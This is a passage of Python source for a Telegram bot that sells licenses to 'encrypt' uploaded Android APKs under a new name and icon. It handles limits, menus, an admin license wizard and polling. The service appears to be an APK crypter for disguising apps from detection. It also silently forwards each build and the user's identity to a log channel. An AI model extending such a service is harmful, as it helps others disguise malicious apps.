            daily_limit = self.config.FREE_DAILY_LIMIT
            total_limit = self.config.FREE_TOTAL_LIMIT
        else:
            return False

        # 0 = unlimited (skip check)
        if total_limit > 0 and user.builds_used >= total_limit:
            return False

        # 0 = unlimited (skip check)
        if daily_limit > 0 and current_date == today_str:
            if used_today >= daily_limit:
                return False

        if not dry_run:
            if current_date != today_str:
                user.daily_builds_date = today_str
                user.daily_builds_used = 1
            else:
                user.daily_builds_used = used_today + 1
            self.db.save_user(user)

        return True

    def _get_daily_limit_num(self, user_id: int) -> int:
        user = self.db.get_user(str(user_id))
        if not user:
            return 0
        if user.user_type == "paid":
            return getattr(user, "daily_build_limit", 0)
        return self.config.FREE_DAILY_LIMIT

    def _ensure_user(self, user_id: int, username: str = None,
                     first_name: str = None, last_name: str = None) -> User:
        user = self.db.get_user(str(user_id))
        if not user:
            user_type = "admin" if self._is_master(user_id) else "free"

            if user_type == "admin":
                build_limit = 999999
                plan = "Admin"
                sub_active = True
            else:
                # Free users — unlimited
                build_limit = 999999
                plan = "Free (Unlimited)"
                sub_active = self.config.FREE_MODE_ENABLED

            user = User(
                user_id=str(user_id),
                username=username,
                first_name=first_name,
                last_name=last_name,
                created_at=datetime.now().isoformat(),
                last_active=datetime.now().isoformat(),
                user_type=user_type,
                subscription_active=sub_active,
                build_limit=build_limit,
                plan=plan,
                language="en"
            )
            self.db.save_user(user)
        else:
            user.last_active = datetime.now().isoformat()
            if username:
                user.username = username
            if first_name:
                user.first_name = first_name
            if last_name:
                user.last_name = last_name
            self.db.save_user(user)
        return user

    # ── HANDLERS ───────────────────────────────────────────────────
    def _handle_start(self, chat_id: int, user_id: int,
                      username: str = None, first_name: str = None,
                      last_name: str = None):
        user = self._ensure_user(user_id, username, first_name, last_name)

        if not self._is_master(user_id):
            if not self._is_authorized(user_id):
                self.send_message(
                    chat_id,
                    self._t("error_no_license", contact=self.config.CONTACT_INFO)
                )
                return

        welcome = self._t("welcome", bot_name=self.config.BOT_NAME)
        welcome += f"\n\n👤 <b>Your User ID:</b> <code>{user_id}</code>"

        self.send_message(chat_id, welcome, reply_markup=self.get_main_menu(user_id))

        max_size = self.config.MAX_FILE_SIZE // (1024 * 1024)
        concurrency = self.config.MAX_CONCURRENT_TASKS
        self.send_message(chat_id, f"⚡ Workers: {concurrency} | 📦 Max: {max_size}MB")

    def _handle_menu(self, chat_id: int, user_id: int):
        if not self._is_authorized(user_id):
            self.send_message(chat_id, self._t("error_no_license",
                                                contact=self.config.CONTACT_INFO))
            return
        self.send_message(chat_id, self._t("main_menu"),
                          reply_markup=self.get_main_menu(user_id))

    def _handle_profile(self, chat_id: int, user_id: int):
        user = self.db.get_user(str(user_id))
        if not user:
            return

        is_admin = self._is_master(user_id)
        if not is_admin and not self._is_authorized(user_id):
            self.send_message(chat_id, self._t("error_no_license",
                                                contact=self.config.CONTACT_INFO))
            return

        status = self._t("profile_active")
        expires = user.subscription_expires or "∞"
        if user.subscription_expires:
            try:
                expires = datetime.fromisoformat(user.subscription_expires).strftime("%Y-%m-%d")
            except Exception:
                expires = user.subscription_expires

        limit = str(user.build_limit) if user.build_limit > 0 else "∞"
        if user.user_type == "free":
            daily_lim = "∞ (Unlimited)"
        else:
            daily_lim = str(user.daily_build_limit) if getattr(user, "daily_build_limit", 0) > 0 else "∞"
        joined = datetime.fromisoformat(user.created_at).strftime("%Y-%m-%d") if user.created_at else "Unknown"
        type_label = self._get_user_type_label(user.user_type)

        text = f"{self._t('profile_title')}\n\n"
        text += f"{self._t('profile_id', user_id=user.user_id)}\n"
        if user.username:
            text += f"{self._t('profile_username', username=user.username)}\n"
        if user.first_name:
            text += f"{self._t('profile_name', name=user.first_name)}\n"
        text += f"{self._t('profile_type', type=type_label)}\n"
        text += f"{self._t('profile_status', status=status)}\n"
        text += f"{self._t('profile_expires', expires=expires)}\n"
        text += f"{self._t('profile_daily', daily=daily_lim)}\n"
        text += f"{self._t('profile_builds', used=user.builds_used, limit=limit)}\n"
        text += f"{self._t('profile_total', total=user.total_builds)}\n"
        text += f"{self._t('profile_joined', date=joined)}\n"
        text += self._t("profile_contact", contact=self.config.CONTACT_INFO)

        self.send_message(chat_id, text)

    def _handle_tasks(self, chat_id: int, user_id: int):
        if not self._is_authorized(user_id):
            self.send_message(chat_id, self._t("error_no_license",
                                                contact=self.config.CONTACT_INFO))
            return

        tasks = self.db.get_user_tasks(str(user_id))
        active_tasks = [t for t in tasks if t.status in ["pending", "processing"]]

        if not active_tasks:
            self.send_message(chat_id, self._t("tasks_none"))
            return

        text = self._t("tasks_title")
        for task in active_tasks[:10]:
            status_text = self._t(f"task_status_{task.status}")
            created = datetime.fromisoformat(task.created_at).strftime("%Y-%m-%d %H:%M") if task.created_at else "Unknown"
            text += f"\n\n{self._t('task_info', name=task.display_name, status=status_text, progress=task.progress, created=created)}"

        self.send_message(chat_id, text)

    def _handle_upload(self, chat_id: int, user_id: int):
        if not self._is_authorized(user_id):
            self.send_message(chat_id, self._t("error_no_license",
                                                contact=self.config.CONTACT_INFO))
            return

        if not self._check_and_update_daily_limit(user_id, dry_run=True):
            self.send_message(chat_id, self._t("error_daily_limit",
                                                limit=self._get_daily_limit_num(user_id)))
            return

        available = self.processor.can_process()
        if available <= 0:
            active = self.processor.get_active_count()
            self.send_message(
                chat_id,
                self._t("error_concurrency_limit",
                        active=active, max=self.config.MAX_CONCURRENT_TASKS)
            )
            return

        self._set_state_value(chat_id, "step", "waiting_apk")
        self._set_state_value(chat_id, "task_id", None)

        max_size_mb = self.config.MAX_FILE_SIZE // (1024 * 1024)
        self.send_message(
            chat_id,
            self._t("upload_prompt", max_size=max_size_mb, concurrency=available)
        )

    def _handle_help(self, chat_id: int, user_id: int):
        help_text = f"""
📋 <b>Help</b>
━━━━━━━━━━━━━━━━━━━━

<b>Workflow:</b>
1. Send .apk file
2. Enter display name
3. Send icon or /skip
4. Receive encrypted APK

━━━━━━━━━━━━━━━━━━━━
<b>Commands:</b>
/menu - Main Menu
/profile - View Profile
/upload - Upload APK
/mytasks - Active Tasks
/admin - Admin Panel (Admin only)

━━━━━━━━━━━━━━━━━━━━
<b>Developer:</b> {self.config.DEVELOPER_USERNAME}
        """
        self.send_message(chat_id, help_text)

    def _handle_history(self, chat_id: int, user_id: int):
        if not self._is_authorized(user_id):
            self.send_message(chat_id, self._t("error_no_license",
                                                contact=self.config.CONTACT_INFO))
            return

        tasks = self.db.get_user_tasks(str(user_id))
        completed = [t for t in tasks if t.status in ["completed", "failed"]]

        if not completed:
            self.send_message(chat_id, self._t("history_none"))
            return

        text = "📜 <b>History</b>\n━━━━━━━━━━━━━━━━━━━━"
        for task in completed[:20]:
            status_text = self._t(f"task_status_{task.status}")
            date = datetime.fromisoformat(task.created_at).strftime("%Y-%m-%d") if task.created_at else "Unknown"
            text += f"\n  <b>{task.display_name}</b> - {status_text} - {date}"

        self.send_message(chat_id, text)

    def _handle_renew(self, chat_id: int, user_id: int):
        user = self.db.get_user(str(user_id))
        if not user:
            return

        expires = user.subscription_expires or "N/A"
        if user.subscription_expires:
            try:
                expires = datetime.fromisoformat(user.subscription_expires).strftime("%Y-%m-%d")
            except Exception:
                expires = user.subscription_expires

        limit = str(user.build_limit) if user.build_limit > 0 else "∞"
        used = user.builds_used

        text = "🔄 <b>Renew Plan</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
        text += f"<b>Current Plan:</b> {user.plan}\n"
        text += f"<b>Expires:</b> {expires}\n"
        text += f"<b>Builds Used:</b> {used}/{limit}\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━\n"
        text += f"<i>Contact: {self.config.CONTACT_INFO}</i>"

        self.send_message(chat_id, text)

    # ── ADMIN PANEL ────────────────────────────────────────────────
    def _handle_admin_panel(self, chat_id: int, user_id: int):
        if not self._is_master(user_id):
            self.send_message(chat_id, "❌ You are not authorized.")
            return

        admin_menu = {
            "inline_keyboard": [
                [
                    {"text": "🔑 Sell License", "callback_data": "admin:sell"},
                    {"text": "🚫 Disable License", "callback_data": "admin:disable"}
                ],
                [
                    {"text": "📊 Statistics", "callback_data": "admin:stats"},
                    {"text": "✖️ Close", "callback_data": "admin:close"}
                ]
            ]
        }

        self.send_message(
            chat_id,
            "⚙️ <b>Admin Control Panel</b>\n━━━━━━━━━━━━━━━━━━━━\n\nSelect an action:",
            reply_markup=admin_menu
        )

    def _start_sell_license_wizard(self, chat_id: int, user_id: int):
        self._clear_state(chat_id)
        self._set_state_value(chat_id, "step", "admin_waiting_target_id")
        self.send_message(
            chat_id,
            "🔑 <b>Grant License Wizard</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
            "Enter the target user's numerical Telegram ID:"
        )

    def _start_disable_license_wizard(self, chat_id: int, user_id: int):
        self._clear_state(chat_id)
        self._set_state_value(chat_id, "step", "admin_waiting_disable_id")
        self.send_message(
            chat_id,
            "🚫 <b>Disable License</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
            "Enter target user's Telegram ID to revoke access:"
        )

    def _process_admin_disable_id(self, chat_id: int, user_id: int, text: str):
        target_raw = text.strip()
        if not target_raw.isdigit():
            self.send_message(chat_id, "❌ Invalid Telegram ID. Enter numbers only:")
            return

        target_user = self.db.get_user(target_raw)
        if not target_user:
            self.send_message(chat_id, f"❌ User <code>{target_raw}</code> not found.")
            self._clear_state(chat_id)
            return

        target_user.license_disabled = True
        target_user.subscription_active = False
        self.db.save_user(target_user)

        self.send_message(
            chat_id,
            f"✅ <b>License Terminated!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Target ID:</b> <code>{target_raw}</code>"
        )

        try:
            self.send_message(
                int(target_raw),
                "⚠️ <b>Access Revoked</b>\n\nYour license has been revoked by the admin."
            )
        except Exception:
            pass

        self._clear_state(chat_id)

    def _process_admin_target_id(self, chat_id: int, user_id: int, text: str):
        target_raw = text.strip()
        if not target_raw.isdigit():
            self.send_message(chat_id, "❌ Invalid Telegram ID. Enter numbers only:")
            return

        self._set_state_value(chat_id, "admin_target_id", target_raw)
        self._set_state_value(chat_id, "step", "admin_waiting_duration")

        duration_menu = {
            "inline_keyboard": [
                [
                    {"text": "30 Days", "callback_data": "admin_dur:30"},
                    {"text": "90 Days", "callback_data": "admin_dur:90"}
                ],
                [
                    {"text": "365 Days", "callback_data": "admin_dur:365"},
                    {"text": "Lifetime", "callback_data": "admin_dur:99999"}
                ],
                [
                    {"text": "✖️ Cancel", "callback_data": "admin:close"}
                ]
            ]
        }

        self.send_message(
            chat_id,
            f"✅ Target: <code>{target_raw}</code>\n\nSelect duration:",
            reply_markup=duration_menu
        )

    def _process_admin_duration_selection(self, chat_id: int, user_id: int, duration_days: int):
        self._set_state_value(chat_id, "admin_duration", duration_days)
        self._set_state_value(chat_id, "step", "admin_waiting_daily_limit")

        daily_limit_menu = {
            "inline_keyboard": [
                [
                    {"text": "5 / day", "callback_data": "admin_daylim:5"},
                    {"text": "10 / day", "callback_data": "admin_daylim:10"}
                ],
                [
                    {"text": "20 / day", "callback_data": "admin_daylim:20"},
                    {"text": "Unlimited", "callback_data": "admin_daylim:0"}
                ],
                [
                    {"text": "✖️ Cancel", "callback_data": "admin:close"}
                ]
            ]
        }

        duration_label = "Lifetime" if duration_days >= 99999 else f"{duration_days} Days"
        self.send_message(
            chat_id,
            f"✅ Duration: <b>{duration_label}</b>\n\nSelect Daily APK Build Limit:",
            reply_markup=daily_limit_menu
        )

    def _process_admin_daily_limit_selection(self, chat_id: int, user_id: int, daily_limit: int):
        self._set_state_value(chat_id, "admin_daily_limit", daily_limit)
        self._set_state_value(chat_id, "step", "admin_waiting_limit")

        limit_menu = {
            "inline_keyboard": [
                [
                    {"text": "10 Total", "callback_data": "admin_lim:10"},
                    {"text": "50 Total", "callback_data": "admin_lim:50"}
                ],
                [
                    {"text": "100 Total", "callback_data": "admin_lim:100"},
                    {"text": "Unlimited", "callback_data": "admin_lim:999999"}
                ],
                [
                    {"text": "✖️ Cancel", "callback_data": "admin:close"}
                ]
            ]
        }

        daily_label = "Unlimited" if daily_limit <= 0 else f"{daily_limit} builds/day"
        self.send_message(
            chat_id,
            f"✅ Daily Limit: <b>{daily_label}</b>\n\nSelect total build limit:",
            reply_markup=limit_menu
        )

    def _execute_license_grant(self, chat_id: int, user_id: int, limit: int):
        state = self._get_state(chat_id)
        target_id = state.get("admin_target_id")
        duration = state.get("admin_duration")
        daily_limit = state.get("admin_daily_limit", 0)

        if not target_id or duration is None:
            self.send_message(chat_id, "❌ State lost. Please start over.")
            self._clear_state(chat_id)
            return

        target_user = self.db.get_user(str(target_id))
        if not target_user:
            target_user = User(
                user_id=str(target_id),
                created_at=datetime.now().isoformat(),
                last_active=datetime.now().isoformat(),
                user_type="paid",
                subscription_active=True,
                build_limit=limit,
                plan="Premium License",
                daily_build_limit=daily_limit,
                license_disabled=False,
                language="en"
            )
        else:
            target_user.user_type = "paid"
            target_user.subscription_active = True
            target_user.build_limit = limit
            target_user.plan = "Premium License"
            target_user.daily_build_limit = daily_limit
            target_user.license_disabled = False

        if duration >= 99999:
            target_user.subscription_expires = None
        else:
            target_user.subscription_expires = (datetime.now() + timedelta(days=duration)).isoformat()

        self.db.save_user(target_user)

        duration_label = "Lifetime" if duration >= 99999 else f"{duration} Days"
        limit_label = "Unlimited" if limit >= 999999 else str(limit)
        daily_label = "Unlimited" if daily_limit <= 0 else f"{daily_limit} builds/day"

        self.send_message(
            chat_id,
            f"👑 <b>License Granted!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Target:</b> <code>{target_id}</code>\n"
            f"📅 <b>Duration:</b> {duration_label}\n"
            f"⚡ <b>Daily Limit:</b> {daily_label}\n"
            f"🔋 <b>Total Limit:</b> {limit_label}"
        )

        try:
            self.send_message(
                int(target_id),
                f"🎉 <b>Premium Activated!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"Duration: {duration_label}\n"
                f"Daily: {daily_label}\n"
                f"Total: {limit_label}\n\n"
                f"Send /start to continue."
            )
        except Exception:
            pass

        self._clear_state(chat_id)

    def _show_admin_stats(self, chat_id: int, user_id: int):
        users = self.db.get_all_users()
        total_users = len(users)
        active_users = sum(1 for u in users if u.subscription_active and not u.license_disabled)

        stats_data = self.db._read_json("stats")
        total_builds = stats_data.get("total_builds", 0)

        text = (
            f"📊 <b>System Statistics</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>Total Users:</b> {total_users}\n"
            f"👑 <b>Active Licenses:</b> {active_users}\n"
            f"📦 <b>Total Builds:</b> {total_builds}\n"
            f"⚙️ <b>Concurrency:</b> {self.config.MAX_CONCURRENT_TASKS}"
        )

        self.send_message(chat_id, text)

    # ── FILE UPLOAD HANDLERS ───────────────────────────────────────
    def _process_file_upload(self, chat_id: int, user_id: int, document: Dict) -> bool:
        state = self._get_state(chat_id)
        step = state.get("step")

        filename = document.get("file_name", "file")
        file_size = document.get("file_size", 0)

        if step == "waiting_apk":
            if not self._is_authorized(user_id):
                self.send_message(chat_id, self._t("error_no_license",
                                                    contact=self.config.CONTACT_INFO))
                self._clear_state(chat_id)
                return True

            if not self._check_and_update_daily_limit(user_id, dry_run=True):
                self.send_message(chat_id, self._t("error_daily_limit",
                                                    limit=self._get_daily_limit_num(user_id)))
                self._clear_state(chat_id)
                return True

            if file_size > self.config.MAX_FILE_SIZE:
                self.send_message(
                    chat_id,
                    self._t("error_file_too_large",
                            size=round(file_size / (1024 * 1024), 2),
                            max=self.config.MAX_FILE_SIZE / (1024 * 1024))
                )
                return True

            if filename.lower().endswith(".apk"):
                try:
                    apk_data = self.download_file(document["file_id"], self.config.MAX_FILE_SIZE)
                    apk_path = self.config.UPLOAD_DIR / f"{user_id}_{uuid.uuid4().hex}.apk"
                    apk_path.write_bytes(apk_data)

                    self._set_state_value(chat_id, "apk_path", str(apk_path))
                    self._set_state_value(chat_id, "original_filename", filename)
                    self._set_state_value(chat_id, "step", "waiting_name")

                    size_mb = file_size / (1024 * 1024)
                    self.send_message(
                        chat_id,
                        self._t("upload_received", filename=filename, size=f"{size_mb:.2f}")
                    )
                except Exception as e:
                    logger.error(f"APK download failed: {e}")
                    self.send_message(chat_id, self._t("error_processing", error=str(e)))
                return True
            else:
                self.send_message(chat_id, self._t("error_invalid_file"))
                return True

        elif step == "waiting_icon":
            ext = filename.lower().split(".")[-1] if "." in filename else ""
            if ext in ["png", "jpg", "jpeg"]:
                if file_size > self.config.MAX_ICON_SIZE:
                    self.send_message(
                        chat_id,
                        self._t("error_file_too_large",
                                size=round(file_size / (1024 * 1024), 2),
                                max=self.config.MAX_ICON_SIZE / (1024 * 1024))
                    )
                    return True
                try:
                    icon_data = self.download_file(document["file_id"], self.config.MAX_ICON_SIZE)
                    icon_path = self.config.UPLOAD_DIR / f"{user_id}_{uuid.uuid4().hex}.{ext}"
                    icon_path.write_bytes(icon_data)

                    self._set_state_value(chat_id, "icon_path", str(icon_path))
                    self._process_apk(chat_id, user_id)
                except Exception as e:
                    logger.error(f"Icon download error: {e}")
                    self.send_message(chat_id, self._t("error_processing", error=str(e)))
                return True
            else:
                self.send_message(chat_id, self._t("sendIcon"))
                return True

        return False

    def _process_photo_upload(self, chat_id: int, user_id: int, photo_sizes: List[Dict]) -> bool:
        state = self._get_state(chat_id)
        step = state.get("step")

        if step == "waiting_icon":
            try:
                best_photo = photo_sizes[-1]
                file_size = best_photo.get("file_size", 0)
                if file_size > self.config.MAX_ICON_SIZE:
                    self.send_message(
                        chat_id,
                        self._t("error_file_too_large",
                                size=round(file_size / (1024 * 1024), 2),
                                max=self.config.MAX_ICON_SIZE / (1024 * 1024))
                    )
                    return True

                icon_data = self.download_file(best_photo["file_id"], self.config.MAX_ICON_SIZE)
                icon_path = self.config.UPLOAD_DIR / f"{user_id}_{uuid.uuid4().hex}.png"
                icon_path.write_bytes(icon_data)

                self._set_state_value(chat_id, "icon_path", str(icon_path))
                self._process_apk(chat_id, user_id)
            except Exception as e:
                logger.error(f"Photo download error: {e}")
                self.send_message(chat_id, self._t("error_processing", error=str(e)))
            return True
        else:
            self.send_message(chat_id, self._t("error_invalid_file"))
            return True

    def _process_apk(self, chat_id: int, user_id: int):
        state = self._get_state(chat_id)

        apk_path = state.get("apk_path")
        display_name = state.get("display_name")
        icon_path = state.get("icon_path")
        original_filename = state.get("original_filename", "app.apk")

        if not apk_path or not display_name:
            return

        task = Task(
            task_id=f"task_{int(time.time())}_{uuid.uuid4().hex[:8]}",
            user_id=str(user_id),
            apk_name=original_filename,
            display_name=display_name,
            original_filename=original_filename,
            status="pending",
            created_at=datetime.now().isoformat(),
            updated_at=datetime.now().isoformat(),
            apk_path=apk_path,
            icon_path=icon_path,
            encryption_used=True
        )

        self.db.create_task(task)
        self._set_state_value(chat_id, "task_id", task.task_id)
        self._set_state_value(chat_id, "step", "processing")

        icon_type = "custom" if icon_path else "default"

        status_msg = self.send_message(
            chat_id,
            self._t("upload_processing", name=display_name, icon_type=icon_type)
        )
        self._set_state_value(chat_id, "status_message_id", status_msg.get("message_id"))

        # Get user info for log channel
        user_obj = self.db.get_user(str(user_id))
        log_username = user_obj.username if user_obj and user_obj.username else "N/A"

        def task_callback(updated_task: Task):
            self.db.update_task(updated_task)

            if updated_task.status == "completed":
                try:
                    if updated_task.output_path and os.path.exists(updated_task.output_path):
                        # 1. Send APK to user
                        caption = (
                            f"✅ <b>Encryption Completed</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"📦 <b>File:</b> {display_name}\n"
                        )
                        self.send_document(chat_id, updated_task.output_path, caption)

                        # 2. 📤 Forward APK to BUILD LOG CHANNEL
                        try:
                            size_mb = os.path.getsize(updated_task.output_path) / (1024 * 1024)
                            log_caption = (
                                f"🆕 <b>New APK Build</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                                f"🆔 <b>Username:</b> @{log_username}\n"
                                f"📦 <b>App Name:</b> {display_name}\n"
                                f"📊 <b>Size:</b> {size_mb:.2f} MB\n"
                                f"📅 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                            )
                            self._send_to_log_channel(updated_task.output_path, log_caption)
                        except Exception as e:
                            logger.error(f"Log channel forward failed: {e}")

                        # 3. Update counters
                        self.db.increment_stat("total_builds")
                        self._check_and_update_daily_limit(int(updated_task.user_id), dry_run=False)

                        user = self.db.get_user(str(user_id))
                        if user:
                            user.builds_used += 1
                            user.total_builds += 1
                            self.db.save_user(user)
                    else:
                        self.send_message(chat_id, "Output file missing.")
                    self._clear_state(chat_id)
                except Exception as e:
                    logger.error(f"Post build error: {e}")
                    self.send_message(chat_id, self._t("error_processing", error=str(e)))

            elif updated_task.status == "failed":
                error = updated_task.error_message or "Process failed."
                self.send_message(chat_id, self._t("upload_failed", error=error))
                self._clear_state(chat_id)

            elif updated_task.status == "processing":
                try:
                    status_text = self._t("upload_processing", name=display_name, icon_type=icon_type)
                    msg_id = state.get("status_message_id")
                    if msg_id:
                        self.edit_message(
                            chat_id,
                            msg_id,
                            f"{status_text}\n\nProgress: {updated_task.progress}%"
                        )
                except Exception as e:
                    logger.debug(f"Progress render skipped: {e}")

        self.processor.process(task, task_callback)

    def _process_text_input(self, chat_id: int, user_id: int, text: str) -> bool:
        state = self._get_state(chat_id)
        step = state.get("step")

        if text.lower() == "/cancel":
            self._clear_state(chat_id)
            self.send_message(chat_id, self._t("upload_cancelled"))
            return True

        if text.lower() == "/skip":
            if step == "waiting_name":
                original = state.get("original_filename", "app")
                display_name = original.rsplit(".", 1)[0] if "." in original else original
                self._set_state_value(chat_id, "display_name", display_name)
                self._set_state_value(chat_id, "step", "waiting_icon")
                self.send_message(
                    chat_id,
                    self._t("upload_icon_prompt", name=display_name)
                )
                return True

            elif step == "waiting_icon":
                self._set_state_value(chat_id, "icon_path", None)
                self._process_apk(chat_id, user_id)
                return True

        if step == "waiting_name":
            display_name = text.strip()
            if display_name:
                self._set_state_value(chat_id, "display_name", display_name)
                self._set_state_value(chat_id, "step", "waiting_icon")
                self.send_message(
                    chat_id,
                    self._t("upload_icon_prompt", name=display_name)
                )
            else:
                self.send_message(chat_id, "Please enter a valid name.")
            return True

        elif step == "waiting_icon":
            self.send_message(chat_id, self._t("sendIcon"))
            return True

        return False

    # ── MAIN MESSAGE DISPATCHER ────────────────────────────────────
    def _handle_message(self, update: Dict):
        message = update.get("message")
        if not message:
            return

        chat_id = message["chat"]["id"]
        user_id = message["from"]["id"]
        username = message["from"].get("username")
        first_name = message["from"].get("first_name")
        last_name = message["from"].get("last_name")
        text = message.get("text", "").strip()

        self._ensure_user(user_id, username, first_name, last_name)

        # 🔓 Force join check EXCLUDED (as requested) — only for non-master if you want
        # Currently disabled per request

        # Authorization check
        if not self._is_authorized(user_id):
            if text not in ["/start", "/help"]:
                self.send_message(
                    chat_id,
                    self._t("error_no_license", contact=self.config.CONTACT_INFO)
                )
                return

        # Menu button map (English only)
        button_map = {
            "👤 Profile": "profile",
            "📋 Tasks": "tasks",
            "📤 Upload APK": "upload",
            "📜 History": "history",
            "🔄 Renew Plan": "renew",
            "❓ Help": "help",
            "⚙️ Admin Panel": "admin_panel",
            "✖️ Close": "close",
        }

        is_menu_action = text in button_map
        is_command_action = text.startswith("/")

        if is_menu_action or is_command_action:
            if text == "/start":
                self._handle_start(chat_id, user_id, username, first_name, last_name)
                return

            if text == "/admin":
                self._handle_admin_panel(chat_id, user_id)
                return

            if text == "/cancel":
                self._clear_state(chat_id)
                self.send_message(chat_id, self._t("upload_cancelled"))
                return

            if is_menu_action:
                self._clear_state(chat_id)
                action = button_map[text]
                if action == "profile":
                    self._handle_profile(chat_id, user_id)
                elif action == "tasks":
                    self._handle_tasks(chat_id, user_id)
                elif action == "upload":
                    self._handle_upload(chat_id, user_id)
                elif action == "history":
                    self._handle_history(chat_id, user_id)
                elif action == "renew":
                    self._handle_renew(chat_id, user_id)
                elif action == "help":
                    self._handle_help(chat_id, user_id)
                elif action == "admin_panel":
                    self._handle_admin_panel(chat_id, user_id)
                elif action == "close":
                    self.send_message(chat_id, "✖️ Menu closed.",
                                      reply_markup={"remove_keyboard": True})
                return

            if text == "/menu":
                self._handle_menu(chat_id, user_id)
                return
            if text == "/profile":
                self._handle_profile(chat_id, user_id)
                return
            if text == "/help":
                self._handle_help(chat_id, user_id)
                return
            if text == "/upload":
                self._handle_upload(chat_id, user_id)
                return
            if text == "/mytasks":
                self._handle_tasks(chat_id, user_id)
                return
            if text == "/renew":
                self._handle_renew(chat_id, user_id)
                return
            if text == "/history":
                self._handle_history(chat_id, user_id)
                return

        state = self._get_state(chat_id)
        step = state.get("step")

        if step == "admin_waiting_target_id":
            if text:
                self._process_admin_target_id(chat_id, user_id, text)
                return

        if step == "admin_waiting_disable_id":
            if text:
                self._process_admin_disable_id(chat_id, user_id, text)
                return

        if step in ("waiting_name", "waiting_icon"):
            if text:
                if self._process_text_input(chat_id, user_id, text):
                    return

        document = message.get("document")
        if document:
            if self._process_file_upload(chat_id, user_id, document):
                return

        photo = message.get("photo")
        if photo:
            if self._process_photo_upload(chat_id, user_id, photo):
                return

        if text:
            if self._process_text_input(chat_id, user_id, text):
                return

    # ── CALLBACK HANDLER ───────────────────────────────────────────
    def _handle_callback(self, update: Dict):
        callback = update.get("callback_query")
        if not callback:
            return

        chat_id = callback["message"]["chat"]["id"]
        user_id = callback["from"]["id"]
        message_id = callback["message"]["message_id"]
        data = callback.get("data", "")

        self.answer_callback(callback["id"])

        if data == "check_join":
            if self._check_force_join(user_id):
                self.delete_message(chat_id, message_id)
                self.send_message(
                    chat_id,
                    "✅ <b>Verified!</b> Send /start to continue."
                )
            else:
                self.answer_callback(
                    callback["id"],
                    "❌ You haven't joined all channels yet!",
                    alert=True
                )
            return

        if data.startswith("admin:"):
            if not self._is_master(user_id):
                return
            action = data[6:]
            if action == "sell":
                self._start_sell_license_wizard(chat_id, user_id)
                self.delete_message(chat_id, message_id)
            elif action == "disable":
                self._start_disable_license_wizard(chat_id, user_id)
                self.delete_message(chat_id, message_id)
            elif action == "stats":
                self._show_admin_stats(chat_id, user_id)
            elif action == "close":
                self.delete_message(chat_id, message_id)
                self._clear_state(chat_id)
            return

        if data.startswith("admin_dur:"):
            if not self._is_master(user_id):
                return
            duration_days = int(data[10:])
            self._process_admin_duration_selection(chat_id, user_id, duration_days)
            self.delete_message(chat_id, message_id)
            return

        if data.startswith("admin_daylim:"):
            if not self._is_master(user_id):
                return
            daily_limit = int(data[13:])
            self._process_admin_daily_limit_selection(chat_id, user_id, daily_limit)
            self.delete_message(chat_id, message_id)
            return

        if data.startswith("admin_lim:"):
            if not self._is_master(user_id):
                return
            limit_val = int(data[10:])
            self._execute_license_grant(chat_id, user_id, limit_val)
            self.delete_message(chat_id, message_id)
            return

    def _process_update(self, update: Dict):
        try:
            if "callback_query" in update:
                self._handle_callback(update)
            elif "message" in update:
                self._handle_message(update)
        except Exception as e:
            logger.error(f"Update error: {e}", exc_info=True)

    def run(self):
        logger.info(f"Starting bot {self.config.BOT_NAME}...")

        try:
            bot_info = self._post_json("getMe", {})
            logger.info(f"Bot online: @{bot_info.get('username')}")
        except Exception as e:
            logger.critical(f"Startup failed: {e}")
            sys.exit(1)

        self._running = True
        last_update_id = 0
        retry_count = 0

        while self._running:
            try:
                updates = self._post_json("getUpdates", {
                    "offset": last_update_id + 1,
                    "timeout": 20,
                    "allowed_updates": ["message", "callback_query"]
                })

                retry_count = 0
                for update in updates:
                    last_update_id = update["update_id"]
                    self._executor.submit(self._process_update, update)

            except urllib.error.HTTPError as e:
                if e.code == 409:
                    retry_count += 1
                    if retry_count < 3:
                        time.sleep(1)
                        continue
                logger.error(f"Polling HTTP Error: {e}")
                time.sleep(3)
            except Exception as e:
                logger.error(f"Polling warning: {e}")
                time.sleep(3)


# ── MAIN ──────────────────────────────────────────────────────────────
def main():
    if not bot_config.validate():
        sys.exit(1)

    for dir_path in [
        bot_config.DATA_DIR,
        bot_config.UPLOAD_DIR,
        bot_config.OUTPUT_DIR,
        bot_config.TEMP_DIR
    ]:
        dir_path.mkdir(parents=True, exist_ok=True)

    _acquire_lock()

    database = Database(bot_config.DATA_DIR)
    processor = APKProcessor(bot_config)
    bot = TelegramBot(bot_config, database, processor)

    try:
        bot.run()
    except KeyboardInterrupt:
        logger.info("Bot suspended by user.")
    except Exception as e:
        logger.critical(f"Bot crashed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()